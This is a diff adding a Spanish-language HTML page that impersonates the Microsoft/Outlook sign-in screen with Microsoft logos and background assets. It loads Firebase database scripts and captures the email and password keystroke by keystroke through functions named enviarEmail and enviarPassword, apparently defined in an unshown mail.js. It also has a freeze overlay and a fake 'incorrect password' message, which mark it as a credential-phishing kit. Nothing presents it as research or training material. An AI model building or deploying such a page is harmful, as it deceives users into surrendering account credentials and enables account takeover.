@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Iniciar sesión - Microsoft</title>
+
+  <!-- 🔌 Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: url('https://logincdn.msauth.net/shared/5/images/fluent_web_light_57fee22710b04cebe1d5.svg') no-repeat center center;
+      background-size: cover;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .card {
+      background: white;
+      border-radius: 8px;
+      width: 360px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding: 40px 35px;
+      display: none;
+      position: relative;
+    }
+    .active { display: block; }
+    .card img.logo { width: 105px; display: block; margin: 0 auto 20px; }
+    h2 { font-weight: 400; font-size: 20px; margin: 15px 0 10px; text-align: center; }
+    p.sub { font-size: 14px; color: #444; margin-bottom: 25px; text-align: center; }
+    input[type="text"], input[type="password"] {
+      width: 93%; padding: 10px; border: 1px solid #888; border-radius: 2px; font-size: 14px; margin-bottom: 5px;
+      background-color: #fff; color: #000;
+    }
+    input::placeholder { color: #888; }
+    .link-left { color: #0067b8; font-size: 13px; margin-bottom: 20px; display: block; text-align: left; cursor: pointer; }
+    button {
+      width: 100%; background: #0078d4; border: none; color: white; padding: 10px;
+      font-size: 15px; border-radius: 2px; cursor: pointer; margin-top: 15px;
+    }
+    .bottom-text { font-size: 13px; text-align: center; margin-top: 25px; }
+    .bottom-text strong { color: #0067b8; cursor: pointer; }
+    .footer { position: absolute; bottom: 10px; font-size: 12px; color: #777; text-align: center; width: 100%; }
+    .pill {
+      display: block; background: #f3f3f3; padding: 5px 10px; border-radius: 20px; font-size: 14px; color: #444;
+      margin: 10px auto; text-align: center; width: fit-content;
+    }
+    .link-center { color: #0067b8; font-size: 13px; text-align: center; margin-top: 30px; padding: 2%; cursor: pointer; }
+    .link-center.second { margin-top: 5px; }
+    .h20 { padding: 10px; font-weight: 400; font-size: 20px; margin: 15px 0 10px; text-align: center; color: #242424; }
+    #bloqueo {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background-color: rgba(255,255,255,0.6); display: none; z-index: 9999;
+    }
+  </style>
+</head>
+
+<body>
+  <!-- 🟩 Paso 1 -->
+  <div class="card active" id="paso1">
+    <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft logo">
+    <h2>Iniciar sesión</h2>
+    <p class="sub">para continuar a Outlook</p>
+    <input type="text" id="emailInput" placeholder="Correo electrónico o número de teléfono" oninput="enviarEmail()">
+    <span class="link-left">¿Olvidaste tu nombre de usuario?</span>
+    <button onclick="irAlPaso2()">Siguiente</button>
+    <div class="bottom-text">¿Eres nuevo en Microsoft? <strong>Crear una cuenta</strong>.</div>
+  </div>
+
+  <!-- 🟨 Paso 2 -->
+  <div class="card" id="paso2">
+    <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft logo">
+    <div class="pill" id="correoMostrado"></div>
+    <h2 class="h20">Escriba la contraseña</h2>
+    <input type="password" id="passwordInput" placeholder="Contraseña" oninput="enviarPassword()">
+    <div id="mensaje-error" style="color: red; font-size: 13px; margin-top: 4px; display: none;">Contraseña incorrecta</div>
+    <button onclick="congelar()">Siguiente</button>
+    <div class="link-center">Otras formas de iniciar sesión</div>
+    <div class="link-center second" onclick="volverAlPaso1()">Iniciar sesión con otra cuenta de Microsoft</div>
+  </div>
+
+  <div class="footer">Ayuda &nbsp; Términos de uso &nbsp; Privacidad y cookies</div>
+  <div id="bloqueo"></div>
+
+  <!-- 🔗 Script separado -->
+  <script src="mail.js"></script>
+</body>
+</html>
